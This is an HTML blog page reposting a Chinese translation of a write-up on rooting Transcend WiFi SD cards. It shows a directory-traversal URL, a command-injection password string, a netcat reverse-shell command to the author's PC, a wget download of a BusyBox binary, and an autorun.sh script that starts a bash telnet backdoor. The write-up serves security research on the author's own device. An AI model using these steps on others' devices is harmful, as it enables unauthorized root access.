@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>创见WiFi SD卡破解之路</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>创见WiFi SD卡破解之路</h2>
+	<p class="meta">2014-03-17</p>
+
+	<div class="post">
+	        <p></p>
+<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><img data-original="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small" title="wifi sd.jpg"></span></p>
+<noscript><img src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small" title="wifi sd.jpg"></noscript>
+<p><span style="color: rgb(0, 176, 80);">我最近搞了张Transcend WiFi SD，颇为得意。它可以让我在几秒钟内将单反（奶昔，相当便携）中拍摄的照片传到任何支持wifi的设备上。</span>我很喜欢在旅途中拍摄和分享图片，所以对我而言，可以无线传输图片的SD卡是一个很好的解决方案。确实如此！（以后也是！）。不过移动应用程序<span style="text-decoration:underline;">可以</span>好好改进下（下载7MB的图像仅仅为了渲染？点击下载后还要重新下载一遍！谁能告诉我这是为什么？），但是，嘿，它能够完成任务！</p>
+<p>这个小小的设备不仅可以存储16GB数据（还有32GB版本），而且还是一个嵌入式系统，能够运行应用程序，包括web服务器，和其他wifi设备通讯，甚至自建无线网络——这个明显的事实让我和我的小伙伴都惊呆了！好了，不废话了，进入主题：我们能不能用这个设备做一些设计之外的事情呢？</p>
+<p><strong>写这篇文章的目的不但是为了指出可以用来root、越狱设备的漏洞，同时也是为了展现摸索、利用漏洞的方法，其中的一些方法可能走不通，但其他的或许会导向万能的根用户。</strong></p>
+<p><span style="font-size: 18px"><strong>准备Hax</strong></span></p>
+<p>我猜这张卡中存在着某种形式的嵌入式Linux系统。如果是这样，扩展它的功能会很容易，但是，首先我需要取得系统的控制权。到现在为止我只使用过和它配套的Android和iOS应用程序，不过很明显，最简单与电脑交互的方式是Web应用程序。下面的想法立即浮现在我的脑海中：</p>
+<pre class="prettyprint lang-cpp">如果移动应用程序很糟糕，那么web应用和服务器肯定也好不到哪里去……也许它充满了等待被利用的漏洞。</pre>
+<p>孩子，我是对的！</p>
+<p>一旦你连接到Web服务器（卡片的IP是192.168.11.254，默认登录admin/admin），你就会感受到和使用手机app一样糟糕的感觉，“用户体验”很糟，“破解体验”应该不错。很多人使用scanners、fuzers之类的强力工具来探索漏洞，然而这个系统的安全性是如此之差，以至于我随意摸索一番，就找到了可以利用的漏洞。</p>
+<p>“Files”区域十分显眼，它允许你浏览SD卡的内容。不幸的是，它不允许你进入SD卡根目录的父目录。果真如此？如果可以进入父目录就好了，我们可以了解系统的内部情况，获得关于它的更多信息。如果我们足够幸运，甚至可以通过Web界面运行一些指令。你会注意到指向“父目录”的链接的URL是这样的（％2F就是URL编码格式中的斜杠字符“/”）：</p>
+<pre class="prettyprint lang-php">http://192.168.11.254/cgi-bin/file_list.pl?dir=%2Fwww%2Fsd</pre>
+<p>好了，让我们试着访问/www，<code>http://192.168.11.254/cgi-bin/file _list.pl?dir=%2Fwww</code></p>
+<p>结果证明此路不通。访问/、/bin、/etc、或任何其他目录都失败了。:( 运气不行。不过，话说回来，如果可行的话，那也太容易了！好吧，其实也没那么困难，程序员真是太粗心。导航栏中<code>?dir=/www/sd/../..</code>同<code>/</code>是一样的效果，成功了！</p>
+<p> </p>
+<p style="text-align: center"><img title="d9f0aa8f36d8a7d2c4f714acf393895e.png" data-original="/imgs/0a8fe031f5a789c295177f84c00e9dc6.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="d9f0aa8f36d8a7d2c4f714acf393895e.png" src="/imgs/0a8fe031f5a789c295177f84c00e9dc6.png!small"></noscript>
+<p> </p>
+<p>哈，太尴尬了！貌似程序员只是确保路径使用/WWW/SD起始，但没有验证父目录的“../”。通过这种方式，我们可以浏览嵌入式系统中的任何文件。当然，点击文件是不会执行它们的，只是下载而已，然而这已经是一个巨大的成功了！</p>
+<p>浏览文件系统、下载脚本之后，很明显系统使用的是busybox，这在我们的意料之中。由于大多数二进制文件的大小是相同的，这暗示它们是指向busybox的软链接。然而，许多不是软链接，包括大多数在/WWW/cgi-bin目录下的脚本。这些可能是值得注意的，因为只需通过浏览器访问它们就可以运行。</p>
+<p><span style="font-size: 18px"><strong>开始Hax</strong></span></p>
+<p>看起来很有希望！现在我们可以访问内部系统，即使只是只读模式，仍然给了我们很大的便利，因为我们能够研究和寻找可以利用的漏洞。:)</p>
+<p>检查一些脚本，找到可以被利用漏洞，没有花掉多少时间。顺便提一下，这些都是Perl脚本。Perl有一个很好的特性就是使用<code>open()</code>调用打开一个文件，因为如果<code>open()</code>的参数不是真正的文件路径，而是以管道符结尾的shell命令的话，例如<code>open("cat/etc/passwd |")</code>，会执行程序。其他滥用<code>open()</code>的手段包括在不同的位置写一个新文件，或者覆盖现有的文件，所以我们可以编写自己的代码并运行它。让我们来看看是否有文件可以被利用。</p>
+<p>有一个文件特别显眼，因为它包含了一个含有用户提供的变量的<code>open()</code>调用。<a href="http://pastebin.com/KQr9NtCA" target="_blank" rel="nofollow">kcard_upload.pl</a>包含以下语句：</p>
+<p style="text-align: center"><img title="9fd5d0702fe516ee6e9a6d1963c54799.png" data-original="/imgs/5cbf2e53e713cbc0dd436dfb06d68025.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="9fd5d0702fe516ee6e9a6d1963c54799.png" src="/imgs/5cbf2e53e713cbc0dd436dfb06d68025.png!small"></noscript>
+<p> </p>
+<p>事实上，Web应用程序并没有使用这个文件。<code>kcard_upload.pl</code>对用户是隐藏的，但它仍然存在，在cgi-bin目录下可以访问。我们只需用浏览器指向它，就可以运行。这真是双倍的尴尬，一个未被使用的可被利用的脚本！但是它真的可以被利用吗？</p>
+<p>通过阅读<code>kcard_upload.pl</code>的代码，我知道这里存在三个利用变量<code>$basename</code>控制系统的挑战：</p>
+<p>首先，<code>$basename</code>不能直接被用户使用，因为它是调用<code>GetBasename($upfile)</code>的结果。用户（即，攻击者）直接使用的是<code>$upfile</code>。更准确地说，它是你选择上传文件时HTML表单的路径。但是，如果我们提交了路径，GetBasename将只返回路径末尾的文件名，其余将被移除。这使遍历目录（如之前提到的../../技巧）不可行。</p>
+<p>其次，<code>$basename</code>由脚本转化为大写，所以无论我们传入什么，都会被转换为大写，这限制了可用的策略。</p>
+<p>最后的挑战是<code>kcard_upload.pl</code>的脚本只允许PNG，JPG，BMP，GIF格式的文件上传。</p>
+<p>所以这是一条死胡同吗？还没那么快！</p>
+<p>如果你更仔细地查看代码，你会意识到尽管程序员想要限制上传文件的类型，然而他们只是检查文件名是否包含这些扩展名，而不是是否以这些扩展名结束。</p>
+<p style="text-align: center"><img title="2ed586641fbfc3bff1a96d436e3bf7d5_article.png" data-original="/imgs/a77267b2c1326c592f30dc43608bf446.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="2ed586641fbfc3bff1a96d436e3bf7d5_article.png" src="/imgs/a77267b2c1326c592f30dc43608bf446.png!small"></noscript>
+<p>此外，这些正则表达式并没有真正检查是否包含<code>.</code>，因为在正则表达式中<code>.</code>可以代表除了换行符以外的任意字符。<code>.</code>应该使用<code>\</code>转义。我猜程序员想要的是<code>/\.GIF$/</code>，但结果写成了<code>/.GIF/</code>，所以我们只需在文件名的任意位置包含三字符组合就可以绕过限制，例如<code>/hi/helPNGlo/asdf.something</code>。太方便了！</p>
+<p> </p>
+<p>由于我们的路径会被转化成大写，也许我们就不能再调用任何系统命令（因为大部分都不是大写），不过也许我们仍然可以上传新的文件，也许是把我们自己的脚本植入系统。我们并不十分关心这些脚本的文件名是大写还是小写。</p>
+<p> </p>
+<p>最后，如果你还记得，我们的路径在保存到变量<code>$basename</code>之前，己经被GetBasename()转化了。<code>GetBasename()</code>的功能是切分路径，获取最后的文件名。所以<code>/path/to/file.txt</code>会变成简单的<code>file.txt</code>。这很糟，因为这意味着我们再也不能操纵路径，不能使用类似“../../bin/our-malicious.script”的技巧，因为它最终会变为“our-malicious.script”，然后保存在DCIM/198_WIFI/。:_(</p>
+<p><span style="font-size: 18px"></span> </p>
+<p style="text-align: center"><img title="图片4_~1.PNG" data-original="/imgs/37807b339c18117a220c176f20b7852b.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="图片4_~1.PNG" src="/imgs/37807b339c18117a220c176f20b7852b.png!small"></noscript>
+<p> </p>
+<p>除非，<code>GetBasename()</code>包含一个可以被利用的漏洞。:_)</p>
+<p>基本上，这些代码考虑了两种情况：用户提供的路径是由windows风格的反斜杠分隔，以及路径由斜杠分隔（除去windows之外的任何OS）。或者说，这是这些代码试图做到的！这些代码真正做的是，检查路径是否包含一个反斜杠，如果包含，那么就判定这是一个windows路径（因为windows路径使用反斜杠作分隔符），然后按照反斜杠分割路径。它并不会真正检查路径是否由斜杠分隔。因此，考虑以下路径：</p>
+<pre class="prettyprint lang-bash">/this/part/gets/discarded\/this/path/is/used</pre>
+<p>由于这个路径包含一个反斜杠（这是一个合法的字符），代码会它认定它是一个windows路径，因此我们最终获得了一个不是真正的基本名的<code>basename</code>，它实际上是一个路径。在我们的例子中，路径将是：/this/path/is/used.</p>
+<p>你看！类似<code>/PNG/something\/../../our-malicious.script</code>的路径将绕过所有安全措施，之后写入我们选定的位置 B-)  这是个好消息。坏消息是这些不能真正生效。啊！这是因为脚本错误地假设<code>../DCIM/198_WIFI</code>存在，但由于脚本从/WWW/cgi-bin运行，所以这个假设不成立（正确的路径应该是../sd/DCIM/198_WIFI）。令人伤心的是我们对此无能为力。这个bug是硬编码到脚本的。开发人员应该没怎么注意这一点，因为这个脚本并不打算提供给用户使用。（记得吗？它是隐藏的。）据我所知，尽管我们做了花了不少功夫，这是一条死胡同。:-( 不过也许有人可以拿出一个创新的方案。</p>
+<p>（此外，<code>kcard_upload.pl</code>输出的表单并不调用自身，而是调用一个名为<code>wifi_upload</code>二进制文件，因此我们需要自己实现HTTP POST调用。）</p>
+<p><span style="font-size: 18px"><strong>Hax继续</strong></span></p>
+<p>不过，注意看！我们已经发现了代码质量如此糟糕，因此肯定还存在很多其他的漏洞（如果你想更有想象力一点，我很肯定<code>kcard_upload.pl</code>调用的/www/cgi-bin/<a href="http://www.gps.caltech.edu/~drf/misc/feldmans/Public/Upload-2.6/sources/upload.c" target="_blank" rel="nofollow">wifi_upload</a>工具，可以通过栈溢出和堆溢出破解，因为代码中有很多混乱的strcpy调用）。事实上，我没有过多地检查这些方面。还有一些我没在这篇里详述的其他死胡同。我下面将详述一个明显的漏洞，非常容易利用：</p>
+<p>从perl脚本直接调用shell命令有很多不同的方法，如果程序员粗心大意地使用不妥的方式调用shell命令，那么也许我们可以运行自己的shell命令！使用perl脚本运行shell代码的一个方法是使用<code>system()</code>调用。事实上，<code>.pl</code>和<code>.cgi</code>文件使用了大量的<code>system()</code>调用，但是它们的参数都是硬编码的，所以没有太多的空间可供操纵或利用。另外一种使用perl调用shell代码的方法是使用<code>qx{}</code>表达式，但是代码中没有使用过这种方式。然而，第三种方式是使用反引号包围shell代码，相当于使用<code>qX{}</code>。事实上很多地方都使用了这种方式，而且shell代码中也使用了用户提供的输入！这意味着他们的shell代码混合了我们的输入，所以可能被用来运行我们自己的代码。</p>
+<p>在kcard_save_config_insup.pl有一行给人的感觉就像圣诞节：</p>
+<p style="text-align: center"><img title="45338aa3e68a13f6a7ece038a05f30e2_article.png" data-original="/imgs/43c7270b9262968ca5ba50bb8655a483.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="45338aa3e68a13f6a7ece038a05f30e2_article.png" src="/imgs/43c7270b9262968ca5ba50bb8655a483.png!small"></noscript>
+<p><span style="font-size: 18px"></span> </p>
+<p>该语句运行<code>$update_auth</code>指定的命令，将<code>$LOGIN_USR</code>和<code>$LOGIN_PWD</code>作为参数。这两个参数直接来自一个表单，这意味着我们可以控制它们的值。没有针对它们内容的检查！更精确地说，这是当你进入Web界面，点击“settings”时显示的一个表单。你可以通过<a href="http://192.168.11.254/kcardX" target="_blank" rel="nofollow">http://192.168.11.254/kcardX</a>120Xedit_config_insup.pl直接访问这个表单。表单询问的是管理员的用户名和密码。这意味着通过选择一个恰当构造的密码，我们可以执行代码！首先，密码必须包含一个分号，以便在<code>$update_path</code>命令执行后可以开始执行一个新shell命令。然后它就可以包含任何我们想要的shell代码。最后，密码必须以＃符号（表明后面的内容是注释）结束，这样后面的内容将被忽略（<code>&gt; /mnt/mtd/config/ia.passwd</code>部分）。</p>
+<p>这很容易测试，例如：<code>admin; echo haxx &gt; /tmp/hi.txt #</code>。</p>
+<p>然而表单进行了合理性测试，它不会允许长密码和奇怪的字符。由于这些检查是通过JavaScript来完成的，而不是在服务器端完成的，绕过它们太容易了。我使用<a href="https://chrome.google.com/webstore/detail/form-editor/klaecimjlbpfompicealiiifcdjnkbpn" target="_blank" rel="nofollow">Form Editor</a> Chrome扩展来摆脱这些问题。</p>
+<p>提交表单后，我们可以很容易地检查漏洞是否有效，只需利用本文前面提到的漏洞访问/tmp。我们甚至可以下载文件然后检查其内容是否正确。 </p>
+<p> </p>
+<p style="text-align: center"><img title="67cb7179e6cea68f1e0b7714d2aaa489.png" data-original="/imgs/53e757241b8d731fe329270b4676025c.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="67cb7179e6cea68f1e0b7714d2aaa489.png" src="/imgs/53e757241b8d731fe329270b4676025c.png!small"></noscript>
+<p> </p>
+<p> </p>
+<p>记得将你的密码恢复为“admin”，否则利用完此漏洞后你需要通过出厂设置重设你的SD卡（当然重设不会影响到你的图片）。</p>
+<h2><span style="font-size: 18px">获取root</span></h2>
+<p>目前为止，我们不仅能够读取嵌入式系统的文件系统中的任何文件，而且也可以执行shell代码，并写入文件。不过，我们仍然缺少合适的shell访问方式。</p>
+<p>查看/usr/bin目录中的内容，我们可以发现，这里有很多可以让我们制造反向shell的好东西：netcat（nc 二进制）、telnet，等等。反向shell是这样工作的，通过我们PC的一个特定端口监听传入的连接，把目标系统连接到它，运行一个shell，通过该连接获取输入，同时通过该连接打印所有输出。建立反向shell的方法你用上所有的手指、脚趾也数不过来，不过最简单的方法是调用netcat：</p>
+<pre class="prettyprint lang-bash">nc 192.168.11.11 1337-e /bin/bash</pre>
+<p>这会让netcat来连接我们的电脑（被分配的IP为192.168.11.11）的1337端口，然后将输入传给bash。当然，你必须使用先前所描述的漏洞来运行这个命令，将你的密码改为<code>admin NC 192.168.11.111337 -e /bin/bash #</code>。不幸的是这根本不起作用。使用telnet或其他工具的技巧也无效。为什么无效呢？nc、telnet和其他工具的软链接在/usr/bin目录下，指令的语法是正确的！事实上，我们亲爱的SD卡内的嵌入式Linux禁用了这些busybox的功能！（我们可以尝试调用telnet或netcat，将stdout和stderr重定向到/tmp/hi.txt来验证一点，使用以下命令<code>nc 192.168.11.111337 -e /bin/bash &amp;\&gt; /tmp/hi.txt</code>。下载hi.txt以后，它的内容会是类似如下的内容：<code>nc: applet not found</code>。这意味着nc被禁用了。真恶心！我们只能通过那个糟糕的表单运行命令，同时不能使用网络工具吗？当然不是！</p>
+<p> </p>
+<p>碰巧的是，transcend脚本使用到了wget，因此wget是启用的。它允许我们下载另一个完整的BusyBox二进制文件 <img data-original="/imgs/171fe10700aec4c28543fc3f7e61484f.gif" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small" alt=":)" class="wp-smiley"> )) 我懒得自己编译，所以我从<a href="http://busybox.net/downloads/binaries/latest/" target="_blank" rel="nofollow">http://busybox.net/downloads/binaries/latest/</a>获取了一个预编译的busybox二进制文件。我把busybox-armv5l二进制文件放在我电脑上的本地web服务器上（我的SD卡没有互联网配置），所以我只是运行了<code>wget http://192.168.11.11/busybox-armv5l</code>，使用表单漏洞将它下载到SD卡的<code>/www/cgi-bin</code>目录。我也运行了<code>chmod a+x /www/cgi-bin/busybox-armv5l</code>确保它随后可以运行。</p>
+<noscript>
+<img src="/imgs/171fe10700aec4c28543fc3f7e61484f.gif" alt=":)" class="wp-smiley"> )) 我懒得自己编译，所以我从<a href="http://busybox.net/downloads/binaries/latest/" target="_blank" rel="nofollow">http://busybox.net/downloads/binaries/latest/</a>获取了一个预编译的busybox二进制文件。我把busybox-armv5l二进制文件放在我电脑上的本地web服务器上（我的SD卡没有互联网配置），所以我只是运行了<code>wget http://192.168.11.11/busybox-armv5l</code>，使用表单漏洞将它下载到SD卡的<code>/www/cgi-bin</code>目录。我也运行了<code>chmod a+x /www/cgi-bin/busybox-armv5l</code>确保它随后可以运行。</noscript>
+<pre class="prettyprint lang-bash">uid=0 gid=0</pre>
+<p>最后，我得到了我的远程shell！运行<code>nc -vv -l 1337</code>我的电脑会监听1337端口，运行<code>/www/cgi-bin/busybox-armv5l nc 192.168.11.11 1337 -e /bin/bash</code>，SD卡在该端口上启用shell。由于下载的busybox二进制文件启用了所有工具，我们可以通过远程shell运行<code>/www/cgi-bin/busybox-armv5l &lt;命令&gt;</code>获得更丰富的shell命令！例如，<code>/www/cgi-bin/busybox-armv5l id</code>告诉我们，我们已经已经以root身份在运行shell。</p>
+<h2><span style="font-size: 18px">更多Hax</span></h2>
+<p>假如你忘记您的密码，需要重设，你可以使用SD卡的恢复出厂设置功能（SD卡中有一个特殊的图片文件，一旦删除，重新启动后就会复位SD卡）。不过，你可以恢复你的明文密码，源于一个非常非常非常粗心的错误。这有一个“隐藏”的perl脚本，kcard_login.pl，负责最狂野的登录过程。它从wsd.conf文件获取密码，然后提供浏览器验证密码的javascrip代码。是的，你没看错。使用javascript进行验证！</p>
+<p style="text-align: center"><img title="12569dbfdb785b8c6806baa9bcc83d06.png" data-original="/imgs/f869c9792223ff044d876aabf9cf12e0.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="12569dbfdb785b8c6806baa9bcc83d06.png" src="/imgs/f869c9792223ff044d876aabf9cf12e0.png!small"></noscript>
+<p>这意味着你只需将浏览器指向<a href="http://192.168.11.254/cgi-bin/kcardX" target="_blank" rel="nofollow">http://192.168.11.254/cgi-bin/kcardX156Xlogin.pl</a>，然后查看页面的源代码就可以以明文方式恢复你的密码。密码就在那儿。</p>
+<p style="text-align: center"><img title="977b36835a429abe19e79cf903021d70_article.png" data-original="/imgs/aee17dfe900aa500f46394dd38a42b59.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="977b36835a429abe19e79cf903021d70_article.png" src="/imgs/aee17dfe900aa500f46394dd38a42b59.png!small"></noscript>
+<p><strong><span style="font-size: 18px">友好的后门</span></strong></p>
+<p><span style="font-size: 16px">启动时自动运行的脚本中，rcS会执行SD卡根目录下的autorun.sh。这将简化开发和破解，创见啊创见！</span></p>
+<p style="text-align: center"><img title="ff682cb9fa706d7dc983bc2b0a41b518_article.png" data-original="/imgs/df647bcc40355e60ee9dac6f635647c3.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="ff682cb9fa706d7dc983bc2b0a41b518_article.png" src="/imgs/df647bcc40355e60ee9dac6f635647c3.png!small"></noscript>
+<p><span style="font-size: 16px">在我的SD卡的根目录下，我有以下脚本（命名为autorun.sh），此外还放了busybox-armv5l，这样我就可以简单地telnet到系统：</span></p>
+<pre class="prettyprint lang-bash">cp /mnt/sd/busybox-armv5l /sbin/busybox
+
+chmod a+x /sbin/busybox/ 
+
+sbin/busybox telnetd -l /bin/bash &amp;</pre>
+<p><span style="font-size: 16px">于是，该卡通电后你就可以登录，完成启动： </span></p>
+<p style="text-align: center"><img title="98e0c1df4c739140e4c5201e80f0db56_article.png" data-original="/imgs/40250aa3c08280fa32f6448d116c2616.png!small" src="/imgs/a1826015d6880e2a6b325d16a792a104.jpg!small"></p>
+<noscript><img title="98e0c1df4c739140e4c5201e80f0db56_article.png" src="/imgs/40250aa3c08280fa32f6448d116c2616.png!small"></noscript>
+<p><span style="font-size: 16px">尽享hacking之乐！:)</span></p>
+<p><span style="font-size: 16px"></span> </p>
+<p><span style="font-size: 16px">原文：<a title="" href="http://haxit.blogspot.com/2013/08/hacking-transcend-wifi-sd-cards.html" target="_self">hacking-transcend-wifi-sd-cards</a></span></p>
+<p><span style="font-size: 16px">翻译：<a href="http://segmentfault.com/">http://segmentfault.com/</a></span></p>
+<p><span style="font-size: 16px">搬运：嘎巴</span></p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
